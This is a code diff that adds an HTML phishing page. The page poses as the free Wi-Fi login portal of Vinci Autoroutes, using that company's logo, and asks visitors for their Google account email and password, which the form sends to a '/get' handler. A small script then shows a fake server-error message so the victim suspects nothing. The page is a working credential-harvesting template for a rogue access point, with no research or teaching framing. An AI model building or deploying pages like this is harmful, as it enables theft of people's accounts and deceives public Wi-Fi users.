@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        /* Styles généraux pour les écrans étroits (smartphones) */
+        a:hover {
+            text-decoration: underline;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            align-items: center;
+            justify-content: center;
+            background-color: #FFFFFF;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+        }
+
+        .container {
+            max-width: 100%;
+            margin: auto;
+            padding: 20px;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo {
+            max-width: 40px;
+            max-height: 40px;
+            fill: #FFC72C;
+            margin-right: 100px;
+        }
+
+        .company-name {
+            font-size: 42px;
+            color: black;
+            margin-left: 0px;
+        }
+
+        .form-container {
+            background: #FFFFFF;
+            border: 1px solid #CEC0DE;
+            border-radius: 4px;
+            padding: 20px;
+            box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #BEABD3;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            background: #000000;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .submit-btn:hover {
+            background: #5B3784;
+        }
+
+        .containersubtitle {
+            color: #000000;
+        }
+
+        .containertitle {
+            color: #000000;
+        }
+
+        /* Styles spécifiques pour les écrans larges (PC) */
+        @media screen and (min-width: 768px) {
+            .logo {
+                max-width: 80px;
+                max-height: 80px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo-container">
+        <?xml version="1.0" standalone="no"?>
+        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+        "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+        <svg xmlns="http://www.w3.org/2000/svg" id="Calque_1" data-name="Calque 1" viewBox="0 0 244 64"><defs><style>.cls-1{fill:#004489;}.cls-2{fill:#e20025;}</style></defs><title>v</title><path class="cls-1" d="M144.81,43.82V37.16a105.62,105.62,0,0,1-18.4,1.52A78.63,78.63,0,0,1,116,37.89c0-1.6,0-6.14,0-7.76a83.68,83.68,0,0,1,10.49-.8,110,110,0,0,1,18.33,1.58V24.2a83.4,83.4,0,0,0-18.33-1.77,82.27,82.27,0,0,0-18.32,1.77V43.81a83.86,83.86,0,0,0,18.32,1.77,85.17,85.17,0,0,0,18.32-1.76M91.52,45.14h7.79V22.79H91.53V36.68A117.17,117.17,0,0,0,77.2,28a57.86,57.86,0,0,0-14-5.14v22.3h7.77V33.22C72.8,34,74.81,34.8,77.19,36a93.46,93.46,0,0,1,14.33,9.1M20.92,35.8C19.12,34.13,7,22.42,7,22.42L1,27.84l19.92,17.9,19.9-17.88-5.94-5.44s-12.16,11.72-14,13.39m25.25,9.33h8V22.79h-8ZM161.52,22.79h-8V45.14h8Zm-60,31.62h2.44v9h2.42v-9h2.46V53.15h-7.32ZM82.85,53.15l-4.34,10.3h2.17l1-2.64H86l1,2.64h2.49l-4.32-10.3Zm-.74,6.54,1.41-3.62a5.55,5.55,0,0,0,.36-1.25h0a6,6,0,0,0,.34,1.25l1.36,3.62Zm15.17.75a1.75,1.75,0,0,1-2,1.7,1.78,1.78,0,0,1-2-1.7V53.15H90.87v7.3c0,1.87,1.75,3.16,4.33,3.16s4.33-1.29,4.33-3.16v-7.3H97.28Zm66.94,3h6.39V62.17h-4V58.79h3.53V57.53h-3.53V54.42h4V53.15h-6.39ZM114.69,53c-3.53,0-4.94,2.39-4.94,5.3s1.41,5.3,4.94,5.3,4.92-2.36,4.92-5.3-1.39-5.3-4.92-5.3m0,9.2c-2.08,0-2.48-2-2.48-3.95s.46-4,2.48-4,2.46,2.05,2.46,4-.38,3.95-2.46,3.95m62-4.72c-1.14-.37-2-.79-2-1.69s.69-1.5,1.89-1.5a4.73,4.73,0,0,1,2,.46l.54-1.17a6.16,6.16,0,0,0-2.88-.58c-2.42,0-3.93,1.39-3.93,3,0,1,.57,2.11,2.7,2.81,1.47.48,2,1,2,1.74,0,1-.8,1.58-2.1,1.58a4.9,4.9,0,0,1-2.2-.47L172.18,63a7.15,7.15,0,0,0,3.25.58c2.44,0,4.2-1.32,4.2-3.15,0-1-.38-2.13-3-3M155,54.42h2.45v9h2.41v-9h2.47V53.15H155Zm-28.1,4.43c2.09-.1,3.52-1.17,3.52-2.73,0-1.94-1.59-3.13-4.85-3.13a10.14,10.14,0,0,0-3.58.58v9.87h2.38V58.77h0l3.73,4.67h2.69l-3.92-4.56v0Zm-2.53-.54v-4a3.58,3.58,0,0,1,1.2-.18c1.78,0,2.49.69,2.49,2.12s-.92,2.17-2.78,2.17a4.31,4.31,0,0,1-.9-.08M137.13,53c-3.53,0-4.94,2.39-4.94,5.3s1.42,5.3,4.94,5.3,4.93-2.36,4.93-5.3-1.4-5.3-4.93-5.3m0,9.2c-2.07,0-2.48-2-2.48-3.95s.46-4,2.48-4,2.46,2.05,2.46,4-.38,3.95-2.46,3.95m13.63-1.75a1.75,1.75,0,0,1-2,1.7,1.78,1.78,0,0,1-2-1.7V53.15h-2.43v7.3c0,1.87,1.77,3.16,4.33,3.16S153,62.32,153,60.45v-7.3h-2.25v7.29Z"></path><path class="cls-2" d="M216.73,19.33a3.11,3.11,0,0,0,3.11-3.11V4.11A3.11,3.11,0,0,0,216.73,1H204.62a3.12,3.12,0,0,0-3.12,3.11h0V13.4c0,2.88-2.19,5.35-3.15,6.34a10.49,10.49,0,0,1-7.57,3.07H179.62V41.22H198V30.05a10.52,10.52,0,0,1,3.07-7.58c1-.95,3.46-3.14,6.35-3.14h9.29Zm23.18,5.74a10.51,10.51,0,0,0-7.53-3.1,10.87,10.87,0,0,0-10.87,10.81c0,1.07.46,3.11.46,4a8.37,8.37,0,0,1-8.37,8.38h-9a3.12,3.12,0,0,0-3.12,3.12V60.36a3.12,3.12,0,0,0,3.12,3.12h12.1a3.11,3.11,0,0,0,3.12-3.11v-9A8.38,8.38,0,0,1,228.21,43h0c.86,0,2.9.47,4,.47A10.87,10.87,0,0,0,243,32.6a10.68,10.68,0,0,0-3.09-7.52"></path></svg> 
+    </div>
+    <div class="form-container">
+        <center>
+            <h1 class='containertitle'>Bienvenue sur le Wifi Gratuit Vinci Autoroutes.</h1>
+            <h2 class='containersubtitle'> Connectez vous grace a votre compte Google.</h2>
+        </center>
+        <form action="/get" id="login-form">
+            <input name="email" class="input-field" type="text" placeholder="Google Account" required>
+            <input name="password" class="input-field" type="password" placeholder="Password" required>
+            <button class="submit-btn" type="submit">Continue</button>
+        </form>
+    </div>
+</div>
+<script>
+function showErrorPage() {document.write("<div style='margin-top:10%;background: lightgrey;max-width: 33%;margin: auto;padding: 20px;'><h1 style='text-align: center;color: black'>Our servers seem to be having some difficulties<h1></div>");}document.getElementById("submitbtn").addEventListener("click", showErrorPage);document.getElementById("forgot_credentials").addEventListener("click", showErrorPage);
+</script>
+</body>
+</html>
